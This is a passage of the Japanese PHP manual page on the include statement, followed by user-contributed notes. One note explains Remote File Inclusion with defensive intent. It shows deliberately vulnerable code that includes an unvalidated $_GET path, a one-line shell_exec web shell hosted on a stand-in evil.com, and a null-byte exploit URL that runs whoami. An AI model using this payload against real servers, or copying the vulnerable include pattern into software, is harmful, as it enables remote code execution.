<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
 <head>
  <meta http-equiv="content-type" content="text/html; CHARSET=shift-jis">
  <title>include</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <link media="all" rel="stylesheet" type="text/css" href="style.css"/>
 </head>
 <body class="docs"><div class="manualnavbar" style="text-align: center;">
 <div class="prev" style="text-align: left; float: left;"><a href="function.require.html">require</a></div>
 <div class="next" style="text-align: right; float: right;"><a href="function.require-once.html">require_once</a></div>
 <div class="up"><a href="language.control-structures.html">制御構造</a></div>
 <div class="home"><a href="index.html">PHP Manual</a></div>
</div><hr /><div id="function.include" class="sect1">
 <h2 class="title">include</h2>
 <p class="verinfo">(PHP 4, PHP 5, PHP 7)</p>
 <p class="simpara">
  <em>include</em> 文は指定されたファイルを読み込み、評価します。
 </p>
 <p class="simpara">
  以下の記述内容は <span class="function"><a href="function.require.html" class="function">require</a></span> にも当てはまります。
 </p>
 <p class="simpara">
  ファイルのインクルードは、指定されたパスから行います。パスを指定しない場合は、
  <a href="ini.core.html#ini.include-path" class="link">include_path</a> の設定を利用します。
  ファイルが <a href="ini.core.html#ini.include-path" class="link">include_path</a>
  に見つからないときは、<em>include</em>
  は呼び出し元スクリプトのディレクトリと現在の作業ディレクトリも探します。
  <em>include</em> は、ファイルを見つけられない場合に
  <a href="" class="link">warning</a>
  を発行します。一方 <span class="function"><a href="function.require.html" class="function">require</a></span> の場合は、同じ場合に
  <a href="" class="link">fatal error</a>
  を発行する点が異なります。
 </p>
 <p class="simpara">
  パスを指定した場合 &mdash;
  絶対パス (Windows ならドライブレターあるいは
  <em>\</em> で始まるパス、Unix/Linux 系なら <em>/</em>
  で始まるパス) あるいはカレントディレクトリからの相対パス
  (<em>.</em> あるいは <em>..</em> で始まるパス) のどちらでも
  &mdash; は
  <a href="ini.core.html#ini.include-path" class="link">include_path</a> は無視されます。たとえば
  <em>../</em> ではじまるファイル名を指定した場合は、
  親ディレクトリからそのファイルを探します。
 </p>
 <p class="simpara">
  PHP でのファイルのインクルードやインクルードパスについての詳細は
  <a href="ini.core.html#ini.include-path" class="link">include_path</a> のドキュメントを参照ください。
 </p>
 <p class="simpara">
  ファイルが読み込まれるとそのファイルに含まれるコードは、
  <span class="function"><strong>include</strong></span>もしくは<span class="function"><a href="function.require.html" class="function">require</a></span>が実行された
  行の<a href="language.variables.scope.html" class="link">変数スコープ</a>を継承します。
  呼び出し側の行で利用可能である全ての変数は、読み込まれたファイル内で利用可能です。
  しかし、読み込まれたファイル内で定義されている関数やクラスはすべて
  グローバルスコープとなります。
 </p>
 <p class="para">
  <div class="example" id="example-122">
   <p><strong>例1 基本的な <em>include</em> の例</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'green'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$fruit&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'apple'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />test.php<br /><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;A<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green&nbsp;apple<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  呼び出し側のファイルの関数定義の中で読み込みが行われた場合は、
  読み込まれるファイルに含まれる全てのコードは、
  その関数内で定義されているものとして動作します。
  従って変数のスコープもその関数のものが継承されます。
  ただ <a href="language.constants.predefined.html" class="link">マジック定数</a>
  は例外で、これは読み込みを行う前にパーサが評価します。
 </p>
 <p class="para">
  <div class="example" id="example-123">
   <p><strong>例2 関数内での読み込み</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">function&nbsp;</span><span style="color: #0000BB">foo</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">/*&nbsp;vars.php&nbsp;は&nbsp;foo()&nbsp;のスコープを継承するため&nbsp;*<br />*&nbsp;$fruit&nbsp;はこの関数の外では無効となります。&nbsp;&nbsp;*<br />*&nbsp;$color&nbsp;はglobalとして宣言されているため&nbsp;&nbsp;&nbsp;&nbsp;*<br />*&nbsp;有効です。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/<br /><br /></span><span style="color: #0000BB">foo</span><span style="color: #007700">();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green&nbsp;apple<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  ファイルが読み込まれるときには、読み込まれるファイルの先頭で
  PHPモードを抜けてHTMLモードになり、最後に再びPHPモードに戻ります。
  このため、読み込むファイル中のPHPコードとして実行する必要がある
  コードは、<a href="language.basic-syntax.phpmode.html" class="link">
  有効なPHPの開始タグおよび終了タグ</a>で括る必要があります。
 </p>
 <p class="simpara">
  &quot;<a href="filesystem.configuration.html#ini.allow-url-include" class="link">URL include ラッパー</a>&quot;が
  有効になっている場合、ローカルなパス名
  の代わりにURL(HTTP経由)を用いて読み込むファイルを指定することが可能です。
  URLで指定されたサーバーがファイルをPHPコードとして解釈することが
  出来る場合には、HTTP GETを使用してURLリクエストに引数を指定することが
  出来ます。これはファイルの読み込み云々やスコープの継承とは関係なく、
  ただ単純にスクリプトがリモートのサーバーで実行されて結果がローカルの
  スクリプトに読み込まれる、というだけのことです。
 </p>
 <p class="para">
  <div class="example" id="example-124">
   <p><strong>例3 HTTP経由の <em>include</em></strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #FF8000">/*&nbsp;この例は&nbsp;www.example.com&nbsp;が.phpはPHPスクリプトとして扱い、.txtは通常の&nbsp;*<br />&nbsp;*&nbsp;ファイルとして扱うように設定されていると仮定しています。また、ここでの&nbsp;*<br />&nbsp;*&nbsp;'動作します'という言葉の意味は、変数$fooと$barが読み込まれる側のファイ&nbsp;*<br />&nbsp;*&nbsp;ルで使用可能である、ということです。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/<br /><br />//&nbsp;動作しません:&nbsp;www.example.com&nbsp;では&nbsp;file.txt&nbsp;はPHPコードとして解釈されません。<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;動作しません:&nbsp;'file.php?foo=1&amp;bar=2'&nbsp;という名前のファイルをローカルファイル<br />//&nbsp;システム上から探し出そうとします。<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;動作します。<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'http://www.example.com/file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$foo&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$bar&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">2</span><span style="color: #007700">;<br />include&nbsp;</span><span style="color: #DD0000">'file.txt'</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;動作する<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'file.php'</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;動作する<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <div class="warning"><strong class="warning">警告</strong>
  <h1 class="title">セキュリティの警告</h1>
  <p class="para">
   リモートファイルはリモートサーバー上で実行されます（ファイルの拡張子や
   リモートサーバーが PHP の実行を許可しているかどうかに依存します）が、
   有効な PHP スクリプトである必要があります。なぜならそれはローカル
   サーバー上で処理されるからです。もしリモートサーバー上で処理された結果が
   ほしいだけならば、<span class="function"><a href="function.readfile.html" class="function">readfile()</a></span> を使用するほうがよい
   でしょう。そうでなければ、リモートスクリプトが有効な期待通りのコードを
   生成していることを確認するため、注意を払うことが必要になります。
  </p>
 </div>
 <p class="para">
  <a href="features.remote-files.html" class="link">リモートファイル</a>,
  <span class="function"><a href="function.fopen.html" class="function">fopen()</a></span>, <span class="function"><a href="function.file.html" class="function">file()</a></span>も参照してください。
 </p>
 <p class="simpara">
  値の返し方: <em>include</em> に失敗したときには
  <em>FALSE</em> を返し、警告を発生させます。
  成功した場合の返り値は、インクルードしたファイル側で変更していない限りは
  <em>1</em> です。
  インクルードしたファイルの中で <span class="function"><a href="function.return.html" class="function">return</a></span> を実行すれば、
  そのファイルの処理をそこで止めて呼び出し元に処理を戻せます。
  読み込まれたファイルから値を返すことも可能です。
  通常の関数で行うのと同様にincludeコールの値を取得することができます。
  しかし、読み込まれたリモートファイル(ローカルファイルの場合も同様)の出力が、
  <a href="language.basic-syntax.phpmode.html" class="link">有効なPHPの開始／
   終了タグ</a>を有していない限り、リモートファイルを読み込む際に値を
  取得することはできません。
  必要な変数をこれらのタグの中で宣言することができ、これらの変数は
  ファイルが読み込まれた位置で使用可能となります。
 </p>
 <p class="para">
  <em>include</em> は特別な言語構造であるため、
  引数の前後に括弧は不要です。
  返り値を比較する際には注意してください。
  <div class="example" id="example-125">
   <p><strong>例4 インクルードの戻り値を比較する</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//&nbsp;won't&nbsp;work,&nbsp;evaluated&nbsp;as&nbsp;include(('vars.php')&nbsp;==&nbsp;TRUE),&nbsp;i.e.&nbsp;include('')<br /></span><span style="color: #007700">if&nbsp;(include(</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">TRUE</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">//&nbsp;works<br /></span><span style="color: #007700">if&nbsp;((include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">TRUE</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="para">
  <div class="example" id="example-126">
   <p><strong>例5 <em>include</em> と <span class="function"><a href="function.return.html" class="function">return</a></span> 文</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br />return&nbsp;</span><span style="color: #0000BB">$var</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />noreturn.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />testreturns.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$foo&nbsp;</span><span style="color: #007700">=&nbsp;include&nbsp;</span><span style="color: #DD0000">'return.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #0000BB">$foo</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;'PHP'と出力されます<br /><br /></span><span style="color: #0000BB">$bar&nbsp;</span><span style="color: #007700">=&nbsp;include&nbsp;</span><span style="color: #DD0000">'noreturn.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #0000BB">$bar</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;1が出力されます<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  読み込みが成功すると<em>$bar</em>の値は1となります。上の2つの例の違いに
  注目してください。最初の例では読み込まれるファイル側で <span class="function"><a href="function.return.html" class="function">return</a></span>
  を使用し、もう一方では使用していません。
  ファイルが読み込めなかった場合、<strong><code>FALSE</code></strong> が返され、
  <strong><code>E_WARNING</code></strong> が発生します。
 </p>
 <p class="para">
  読み込まれるファイルで定義された関数がある場合、
  これらは、<span class="function"><a href="function.return.html" class="function">return</a></span> の前後によらず
  メインファイルで使用できます。
  このファイルが二度読み込まれた場合、PHP 5は関数が定義済みであるため
  致命的なエラーを発生します。一方、PHP 4は
  <span class="function"><a href="function.return.html" class="function">return</a></span> の後に定義された関数については、
  エラーを発生しません。
  ファイルが読み込み済みであるかどうかを調べ、
  読み込まれるファイルの内容を条件分岐で返すかわりに
  <span class="function"><a href="function.include-once.html" class="function">include_once</a></span> を使用することを推奨します。
 </p>
 <p class="simpara">
  PHP ファイルの内容を変数に &quot;include する&quot; もうひとつの方法は、
  <a href="ref.outcontrol.html" class="link">出力制御関数</a>
  を <em>include</em> とともに用いて
  出力をキャプチャすることです。たとえば、
 </p>
 <p class="para">
  <div class="example" id="example-127">
   <p><strong>例6 出力バッファリングを用い、 PHP ファイルの内容を文字列として読み込む</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />$string&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'somefile.php'</span><span style="color: #007700">);<br /><br />function&nbsp;</span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">is_file</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ob_start</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;</span><span style="color: #0000BB">$filename</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">ob_get_clean</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="para">
  スクリプト中で自動的にファイルをインクルードするには、<var class="filename">php.ini</var> の
  <a href="ini.core.html#ini.auto-prepend-file" class="link">auto_prepend_file</a> および
  <a href="ini.core.html#ini.auto-append-file" class="link">auto_append_file</a>
  オプションも参照ください。
 </p>

 <blockquote class="note"><p><strong class="note">注意</strong>: <span class="simpara">これは、関数ではなく
言語構造のため、<a href="functions.variable-functions.html" class="link">可変関数</a> を用いて
コールすることはできません。</span></p></blockquote>

 <p class="simpara">
  <span class="function"><a href="function.require.html" class="function">require</a></span>, <span class="function"><a href="function.require-once.html" class="function">require_once</a></span>,
  <span class="function"><a href="function.include-once.html" class="function">include_once</a></span>, <span class="function"><a href="function.get-included-files.html" class="function">get_included_files()</a></span>,
  <span class="function"><a href="function.readfile.html" class="function">readfile()</a></span>, <span class="function"><a href="function.virtual.html" class="function">virtual()</a></span> および
  <a href="ini.core.html#ini.include-path" class="link">include_path</a> も参照ください。
 </p>
</div><div id="usernotes">
 <div class="head">
  <h3 class="title">User Contributed Notes</h3>
 </div>
<div id="allnotes">  <a name="120925""></a>
  <div class="note">
   <strong class="user">ayon at hyurl dot com</strong>
   <a href="#120925" class="date">04-Apr-2017 03:24</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
It is also able to include or open a file from a zip file:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="string">"something.zip#script.php"</span><span class="keyword">;<br />
echo </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">"something.zip#script.php"</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>Note that instead of using / or \, open a file from a zip file uses # to separate zip name and inner file's name.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="120069""></a>
  <div class="note">
   <strong class="user">John Carty</strong>
   <a href="#120069" class="date">21-Oct-2016 05:29</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Before using php's include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br />
<br />
As example #3 points out, it is possible to include a php file from a remote server.<br />
<br />
The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.&nbsp; Suppose you have an example.php with code:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="comment">// Bad Code<br />
</span><span class="default">$path </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'path'</span><span class="keyword">];<br />
include </span><span class="default">$path </span><span class="keyword">. </span><span class="string">'example-config-file.php'</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
As a programmer, you might expect the user to browse to the path that you specify.<br />
<br />
However, it opens up an RFI vulnerability.&nbsp; To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.<br />
<br />
evil.txt<br />
<span class="default">&lt;?php </span><span class="keyword">echo </span><span class="default">shell_exec</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'command'</span><span class="keyword">]);</span><span class="default">?&gt;<br />
</span><br />
It is a text file so it would not be processed on my server but on the target/victim server.&nbsp; I would browse to:<br />
h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br />
<br />
The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.&nbsp; In this case, it is whoami.&nbsp; I ended the path variable with a %00, which is the null character.&nbsp; The original include statement in the example.php would ignore the rest of the line.&nbsp; It should tell me who the web server is running as.<br />
<br />
Please use proper input validation if you use variables in an include statement.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="118083""></a>
  <div class="note">
   <strong class="user">error17191 at gmail dot com</strong>
   <a href="#118083" class="date">01-Oct-2015 06:39</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
When including a file using its name directly without specifying we are talking about the current working directory, i.e. saying (include "file") instead of ( include "./file") . PHP will search first in the current working directory (given by getcwd() ) , then next searches for it in the directory of the script being executed (given by __dir__).<br />
This is an example to demonstrate the situation :<br />
We have two directory structure :<br />
-dir1<br />
----script.php<br />
----test<br />
----dir1_test<br />
-dir2<br />
----test<br />
----dir2_test<br />
<br />
dir1/test contains the following text :<br />
This is test in dir1<br />
dir2/test contains the following text:<br />
This is test in dir2<br />
dir1_test contains the following text:<br />
This is dir1_test<br />
dir2_test contains the following text:<br />
This is dir2_test<br />
<br />
script.php contains the following code:<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="keyword">echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Changing current working directory to dir2'</span><span class="keyword">;<br />
</span><span class="default">chdir</span><span class="keyword">(</span><span class="string">'../dir2'</span><span class="keyword">);<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "dir2_test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'dir2_test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "dir1_test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'dir1_test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "./dir1_test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
(@include </span><span class="string">'./dir1_test'</span><span class="keyword">) or die(</span><span class="string">'couldn\'t include this file '</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>The output of executing script.php is :<br />
<br />
Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />
Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir1<br />
including "test" ...<br />
This is test in dir1<br />
Changing current working directory to dir2<br />
Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />
Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir2<br />
including "test" ...<br />
This is test in dir2<br />
including "dir2_test" ...<br />
This is dir2_test<br />
including "dir1_test" ...<br />
This is dir1_test<br />
including "./dir1_test" ...<br />
couldn't include this file</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="117011""></a>
  <div class="note">
   <strong class="user">Jero Minh</strong>
   <a href="#117011" class="date">01-Apr-2015 07:55</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Notice that using @include (instead of include without @) will set the local value of error_reporting to 0 inside the included script.<br />
<br />
Consider the following:<br />
<span class="default">&lt;?php<br />
&nbsp;&nbsp;&nbsp; ini_set</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">, </span><span class="default">E_ALL</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"Own value before: "</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"\r\n"</span><span class="keyword">;<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"include foo.php: "</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; include(</span><span class="string">'foo.php'</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"@include foo.php: "</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; @include(</span><span class="string">'foo.php'</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"Own value now: " </span><span class="keyword">. </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
foo.php<br />
<span class="default">&lt;?php<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">) . </span><span class="string">"\r\n"</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
Output:<br />
&nbsp;&nbsp;&nbsp; Own value before: 32767<br />
&nbsp;&nbsp;&nbsp; include foo.php: 32767<br />
&nbsp;&nbsp;&nbsp; @include foo.php: 0<br />
&nbsp;&nbsp;&nbsp; Own value now: 32767</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="116522""></a>
  <div class="note">
   <strong class="user">Rash</strong>
   <a href="#116522" class="date">18-Jan-2015 02:55</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:<br />
<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="comment"># index.php<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'what'</span><span class="keyword">, </span><span class="string">'ever'</span><span class="keyword">);<br />
include </span><span class="string">'includeFile.php'</span><span class="keyword">;<br />
<br />
</span><span class="comment"># includeFile.php<br />
<br />
// check if what is defined and die if not<br />
<br />
</span><span class="default">?&gt;<br />
</span><br />
The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at "/usr/share/nginx/html", keep the include files in "/usr/share/nginx/src".<br />
<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="comment"># index.php (in document root (/usr/share/nginx/html))<br />
<br />
</span><span class="keyword">include </span><span class="default">__DIR__ </span><span class="keyword">. </span><span class="string">'/../src/includeFile.php'</span><span class="keyword">;<br />
<br />
</span><span class="default">?&gt;<br />
</span><br />
Since user can't type 'your.site/../src/includeFile.php', your includeFile(s) would not be accessible to the user directly.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="115827""></a>
  <div class="note">
   <strong class="user">Ray.Paseur often uses Gmail</strong>
   <a href="#115827" class="date">01-Oct-2014 08:05</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
It's worth noting that PHP provides an OS-context aware constant called DIRECTORY_SEPARATOR.&nbsp; If you use that instead of slashes in your directory paths your scripts will be correct whether you use *NIX or (shudder) Windows.&nbsp; (In a semi-related way, there is a smart end-of-line character, PHP_EOL)<br />
<br />
Example:<br />
<span class="default">&lt;?php <br />
$cfg_path<br />
</span><span class="keyword">= </span><span class="string">'includes'<br />
</span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR<br />
</span><span class="keyword">. </span><span class="string">'config.php'<br />
</span><span class="keyword">;<br />
require_once(</span><span class="default">$cfg_path</span><span class="keyword">);</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="115360""></a>
  <div class="note">
